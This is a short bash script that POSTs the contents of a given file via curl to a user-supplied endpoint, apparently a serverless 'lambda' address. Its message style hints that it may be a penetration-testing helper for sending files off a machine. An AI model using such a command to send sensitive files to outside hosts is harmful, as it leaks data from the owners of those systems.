if [ $# -eq 0 ] 
then
    echo "[!] Usage: ${0} <file-to-send>"
    exit 1
fi

lambda_addr=""  # fill in
if [ -z $lambda_addr ]; then
	echo "[!] lambda_addr isn't defined, overwrite me!"
	exit 1
fi

if [ ! -f "$1" ]; then
    echo "[!] File '$1' wasn't found"
    exit 1
fi

curl --data "@${1}" $lambda_addr
echo